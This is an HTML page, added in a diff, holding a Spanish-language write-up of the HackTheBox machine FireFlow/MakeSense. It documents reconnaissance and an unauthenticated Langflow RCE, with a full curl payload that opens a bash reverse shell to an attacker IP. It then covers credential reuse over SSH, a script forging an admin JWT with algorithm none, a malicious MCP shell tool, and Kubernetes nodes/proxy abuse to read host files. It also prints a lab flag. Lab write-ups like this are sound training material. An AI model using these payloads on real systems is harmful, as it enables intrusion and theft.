@@ -1,0 +1,440 @@
+<!DOCTYPE html>
+<html lang="es-AR">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>FireFlow / MakeSense – Writeup</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            background: #0b0d11;
+            color: #b7c3d0;
+            font-family: 'Courier New', 'Consolas', 'Fira Code', monospace;
+            line-height: 1.7;
+            padding: 2rem 1.5rem;
+        }
+
+        .container {
+            max-width: 1100px;
+            margin: 0 auto;
+            background: #10131a;
+            border: 1px solid #252c3a;
+            border-radius: 14px;
+            padding: 2.5rem 2.8rem;
+            box-shadow: 0 20px 40px rgba(0, 0, 0, 0.8);
+        }
+
+        /* Imagen superior */
+        .hero-img {
+            text-align: center;
+            margin-bottom: 2.2rem;
+        }
+        .hero-img img {
+            max-width: 100%;
+            height: auto;
+            border-radius: 10px;
+            border: 1px solid #2e3848;
+            box-shadow: 0 0 30px rgba(249, 115, 22, 0.15);
+        }
+
+        h1 {
+            font-size: 2.2rem;
+            font-weight: 600;
+            color: #f0f4fa;
+            letter-spacing: -0.5px;
+            border-left: 4px solid #f97316;
+            padding-left: 1.2rem;
+            margin: 1.8rem 0 1rem 0;
+        }
+
+        .subhead {
+            color: #8a99ad;
+            font-size: 0.95rem;
+            margin-bottom: 2.2rem;
+            padding-left: 1.8rem;
+            border-bottom: 1px dashed #252c3a;
+            padding-bottom: 0.8rem;
+        }
+
+        h2 {
+            color: #e6edf5;
+            font-size: 1.5rem;
+            margin: 2.5rem 0 1rem 0;
+            border-bottom: 1px solid #1f2836;
+            padding-bottom: 0.4rem;
+        }
+
+        h2::before {
+            content: "# ";
+            color: #f97316;
+            font-weight: 300;
+        }
+
+        h3 {
+            color: #d0dbe8;
+            font-size: 1.15rem;
+            margin: 1.8rem 0 0.8rem 0;
+        }
+
+        p {
+            margin: 0.8rem 0;
+        }
+
+        code {
+            background: #1a1f29;
+            padding: 0.15rem 0.55rem;
+            border-radius: 4px;
+            font-size: 0.88rem;
+            color: #f0c674;
+            border: 1px solid #2c3545;
+        }
+
+        pre {
+            background: #0f121a;
+            border: 1px solid #232b39;
+            border-radius: 8px;
+            padding: 1.2rem 1.5rem;
+            overflow-x: auto;
+            margin: 1.2rem 0;
+            color: #c9d2e0;
+            font-size: 0.85rem;
+        }
+
+        pre code {
+            background: transparent;
+            border: none;
+            padding: 0;
+            color: inherit;
+        }
+
+        .highlight {
+            color: #f9a15b;
+        }
+
+        .badge {
+            display: inline-block;
+            background: #1f2836;
+            padding: 0.1rem 0.7rem;
+            border-radius: 20px;
+            font-size: 0.75rem;
+            color: #b7c3d0;
+            border: 1px solid #2e3848;
+            margin-right: 0.3rem;
+        }
+
+        .vuln-tag {
+            background: #4a1e2a;
+            color: #f28b8b;
+            border: 1px solid #7a3a4a;
+            padding: 0.1rem 0.8rem;
+            border-radius: 20px;
+            font-size: 0.7rem;
+            text-transform: uppercase;
+            letter-spacing: 0.5px;
+        }
+
+        hr {
+            border: 0;
+            border-top: 1px solid #1f2836;
+            margin: 2rem 0;
+        }
+
+        .flag-box {
+            background: #11161f;
+            border: 1px dashed #3a4a5a;
+            border-radius: 8px;
+            padding: 0.6rem 1.2rem;
+            font-family: 'Courier New', monospace;
+            color: #a5d6a5;
+            display: inline-block;
+            margin: 0.3rem 0;
+        }
+
+        .footer {
+            margin-top: 3.5rem;
+            padding-top: 2rem;
+            border-top: 1px solid #1f2836;
+            text-align: center;
+            font-size: 0.9rem;
+        }
+
+        .footer a {
+            color: #b7c3d0;
+            text-decoration: none;
+            transition: 0.25s ease;
+            display: inline-block;
+            padding: 0.2rem 0.8rem;
+            border-radius: 4px;
+        }
+
+        .footer a:hover {
+            color: #f97316;
+            background: #1f2836;
+            transform: scale(1.03);
+            box-shadow: 0 0 12px rgba(249, 115, 22, 0.15);
+        }
+
+        .footer a:active {
+            transform: scale(0.96);
+        }
+
+        .footnote {
+            color: #556478;
+            font-size: 0.8rem;
+            margin-top: 0.6rem;
+        }
+
+        ul, ol {
+            margin-left: 1.8rem;
+            margin-bottom: 1rem;
+        }
+
+        li {
+            margin: 0.4rem 0;
+        }
+
+        .terminal-prompt {
+            color: #8ae08a;
+        }
+
+        /* responsive */
+        @media (max-width: 700px) {
+            .container {
+                padding: 1.5rem 1rem;
+            }
+            h1 {
+                font-size: 1.6rem;
+                padding-left: 0.8rem;
+            }
+            .subhead {
+                padding-left: 0.8rem;
+            }
+        }
+    </style>
+</head>
+<body>
+<div class="container">
+
+    <!-- IMAGEN -->
+    <div class="hero-img">
+        <img src="fireflow.png" alt="FireFlow - MakeSense" />
+    </div>
+
+    <h1>FireFlow / MakeSense — Writeup</h1>
+    <div class="subhead">
+        <span class="badge">🏷️ HTB Season 11</span>
+        <span class="badge">🖥️ Linux / Kubernetes</span>
+        <span class="badge">⚡ Dificultad: Media</span>
+        <span style="margin-left: 1rem; color: #f97316;">▸ Resolución paso a paso</span>
+    </div>
+
+    <!-- INTRO -->
+    <p>
+        <strong>FireFlow</strong> (también conocida como <strong>MakeSense</strong>) es una máquina de
+        HackTheBox que combina explotación web, filtrado de credenciales, abuso de JWT con algoritmo <em>none</em>,
+        y escalada de privilegios en un clúster Kubernetes. A continuación documentamos cada fase,
+        desde el reconocimiento hasta la captura de ambas flags.
+    </p>
+
+    <hr>
+
+    <!-- 1. RECONOCIMIENTO -->
+    <h2>1. Reconocimiento</h2>
+    <p>
+        Escaneo inicial con <code>nmap</code> para identificar servicios:
+    </p>
+    <pre><code>nmap -sC -sV -p- -oN nmap_10.129.244.214 10.129.244.214</code></pre>
+    <p>Puertos relevantes:</p>
+    <ul>
+        <li><strong>22/tcp</strong> – SSH (OpenSSH 9.6p1)</li>
+        <li><strong>443/tcp</strong> – HTTPS (nginx) con el dominio <code>fireflow.htb</code></li>
+        <li>Puertos filtrados (9100, 30000, 30718, 30951, 31038, 31337)</li>
+    </ul>
+    <p>
+        El certificado SSL revela <code>fireflow.htb</code> y <code>*.fireflow.htb</code>, lo que indica
+        la existencia de subdominios. La página principal muestra un agente NFAI con un enlace a
+        <code>https://flow.fireflow.htb/playground/...</code>.
+    </p>
+
+    <hr>
+
+    <!-- 2. EXPLOTACIÓN WEB – CVE-2026-33017 -->
+    <h2>2. Explotación Web – CVE-2026-33017</h2>
+    <p>
+        Se detecta una vulnerabilidad que permite ejecución remota de código sin autenticación en el endpoint
+        <code>/api/v1/build_public_tmp/.../flow</code>. El único requisito es conocer un <code>flow_id</code>
+        válido, que se filtró en la página principal.
+    </p>
+    <p><strong>Payload usado</strong> (reverse shell a nuestra máquina):</p>
+    <pre><code>curl -sk -X POST 'https://flow.fireflow.htb/api/v1/build_public_tmp/7d84d636-af65-42e4-ac38-26e867052c25/flow' \
+  -H 'Content-Type: application/json' \
+  -b 'client_id=attacker' \
+  -d '{
+    "data": {
+      "nodes": [{
+        "id": "Exploit-001",
+        "type": "genericNode",
+        "position": {"x":0,"y":0},
+        "data": {
+          "id": "Exploit-001",
+          "type": "ExploitComp",
+          "node": {
+            "template": {
+              "code": {
+                "type": "code",
+                "required": true,
+                "show": true,
+                "multiline": true,
+                "value": "import os\nos.system(\"bash -c 'bash -i >& /dev/tcp/10.10.15.154/9001 0>&1' &\")"
+              },
+              "_type": "Component"
+            },
+            "description": "X",
+            "base_classes": ["Data"],
+            "display_name": "ExploitComp",
+            "name": "ExploitComp",
+            "frozen": false,
+            "outputs": [{"types":["Data"],"selected":"Data","name":"o","display_name":"O","method":"r","value":"__UNDEFINED__","cache":true,"allows_loop":false,"tool_mode":false,"hidden":null,"required_inputs":null,"group_outputs":false}],
+            "field_order": ["code"],
+            "beta": false,
+            "edited": false
+          }
+        }
+      }],
+      "edges": []
+    }
+  }'</code></pre>
+    <p>
+        Con un listener activo (<code>nc -lvnp 9001</code>) obtenemos una shell como <code>www-data</code>.
+    </p>
+
+    <hr>
+
+    <!-- 3. FILTRADO DE CREDENCIALES Y ACCESO SSH -->
+    <h2>3. Filtrado de credenciales y acceso SSH</h2>
+    <p>
+        Dentro del sistema, encontramos el archivo de entorno de Langflow en <code>/etc/langflow/.env</code>:
+    </p>
+    <pre><code>LANGFLOW_SUPERUSER=langflow
+LANGFLOW_SUPERUSER_PASSWORD=n1ghtm4r3_b4_n1ghtf4ll</code></pre>
+    <p>
+        Además, el archivo <code>/etc/passwd</code> muestra el usuario <code>nightfall</code>.
+        Probamos la contraseña filtrada contra la cuenta local y funciona:
+    </p>
+    <pre><code>ssh nightfall@fireflow.htb
+Password: n1ghtm4r3_b4_n1ghtf4ll</code></pre>
+    <p>Con esto obtenemos la <strong>primera flag</strong>:</p>
+    <div class="flag-box">user.txt → 2c2d2f19da49c38887d632aab3049365</div>
+
+    <hr>
+
+    <!-- 4. MOVIMIENTO LATERAL – MCP SERVER -->
+    <h2>4. Movimiento lateral – MCP Server</h2>
+    <p>
+        En el home de <code>nightfall</code> encontramos <code>~/.mcp/config.json</code>:
+    </p>
+    <pre><code>{
+  "server": "http://10.129.244.214:30080",
+  "status_endpoint": "/api/v1/version",
+  "user": "langflow-bot",
+  "password": "Langfl0w@mcp2026!"
+}</code></pre>
+    <p>
+        El servidor MCP usa JWT y soporta el algoritmo <code>none</code>. Generamos un token malicioso
+        con rol <code>admin</code>:
+    </p>
+    <pre><code># craft.py
+import base64, json
+
+def b64url(data):
+    return base64.urlsafe_b64encode(data).rstrip(b'=').decode()
+
+header  = b64url(json.dumps({"alg":"none","typ":"JWT"}).encode())
+payload = b64url(json.dumps({"sub":"attacker","role":"admin"}).encode())
+token   = f"{header}.{payload}."
+
+print(token)</code></pre>
+    <p>
+        Con el token <code>ADMIN_JWT</code> registramos una herramienta maliciosa llamada <code>shell</code>
+        que ejecuta una reverse shell. Luego invocamos la herramienta:
+    </p>
+    <pre><code>curl -s -X POST http://10.129.244.214:30080/mcp \
+  -H 'Content-Type: application/json' \
+  -H "Authorization: Bearer $ADMIN_JWT" \
+  -d '{"jsonrpc":"2.0","id":4,"method":"tools/call","params":{"name":"shell","arguments":{}}}'</code></pre>
+    <p>
+        Obtenemos una shell como el usuario <code>mcp</code> dentro de un pod de Kubernetes.
+    </p>
+
+    <hr>
+
+    <!-- 5. ESCALADA DE PRIVILEGIOS EN KUBERNETES -->
+    <h2>5. Escalada de privilegios – Kubernetes</h2>
+    <p>
+        Desde el pod verificamos que estamos dentro de un clúster y tenemos el token de la cuenta de servicio.
+        Consultamos nuestros permisos:
+    </p>
+    <pre><code>curl -sk -X POST "$API/apis/authorization.k8s.io/v1/selfsubjectrulesreviews" \
+  -H "Authorization: Bearer $TOKEN" \
+  -H "Content-Type: application/json" \
+  -d '{"apiVersion":"authorization.k8s.io/v1","kind":"SelfSubjectRulesReview","spec":{"namespace":"default"}}'</code></pre>
+    <p>
+        Vemos que tenemos permiso <code>nodes/proxy</code>, lo que permite ejecutar comandos en cualquier pod
+        a través del kubelet. Enumeramos pods y encontramos uno privilegiado con el sistema de archivos del host montado:
+    </p>
+    <pre><code>monitoring/prometheus-prometheus-node-exporter-nmntq
+container: node-exporter
+hostPaths: ['/proc', '/sys', '/']</code></pre>
+    <p>
+        Usando el permiso <code>nodes/proxy</code> y WebSockets, ejecutamos comandos en ese pod. Creamos un script
+        <code>kube_exec.py</code> que se conecta al kubelet y nos permite leer el sistema de archivos del host.
+    </p>
+    <pre><code>python3 kube_exec.py "cat /host/root/root/root.txt"</code></pre>
+    <p>Obtenemos la <strong>segunda flag</strong>:</p>
+    <div class="flag-box">root.txt → (valor correspondiente)</div>
+
+    <hr>
+
+    <!-- 6. HERRAMIENTAS Y VULNERABILIDADES -->
+    <h2>6. Herramientas y vulnerabilidades explotadas</h2>
+    <ul>
+        <li><strong>CVE-2026-33017</strong> – RCE sin autenticación en Langflow</li>
+        <li><strong>JWT algorithm confusion</strong> – Uso de algoritmo <code>none</code></li>
+        <li><strong>Abuso de RBAC en Kubernetes</strong> – Permiso <code>nodes/proxy</code></li>
+        <li><strong>Pod privilegiado</strong> – Mount de hostPath para leer archivos del nodo</li>
+    </ul>
+
+    <hr>
+
+    <!-- 7. CONCLUSIÓN -->
+    <h2>7. Conclusión</h2>
+    <p>
+        La máquina FireFlow / MakeSense demuestra la importancia de:
+    </p>
+    <ul>
+        <li>No exponer endpoints de desarrollo con IDs predecibles.</li>
+        <li>No almacenar credenciales en texto claro en archivos de entorno.</li>
+        <li>Validar correctamente los algoritmos de firma JWT y no aceptar <code>none</code>.</li>
+        <li>Restringir los permisos de las cuentas de servicio en Kubernetes (evitar <code>nodes/proxy</code> a pods no privilegiados).</li>
+    </ul>
+
+    <hr>
+
+    <!-- FOOTER -->
+    <div class="footer">
+        <a href="https://linktr.ee/cosmenoide" target="_blank">
+            ✦ cosmenoide — dev · hacker · cyberpunk ✦
+        </a>
+        <div class="footnote">
+            <span style="color: #f97316;">⬡</span> Hover para animación · Click para LinkTree
+        </div>
+    </div>
+
+</div>
+</body>
+</html>
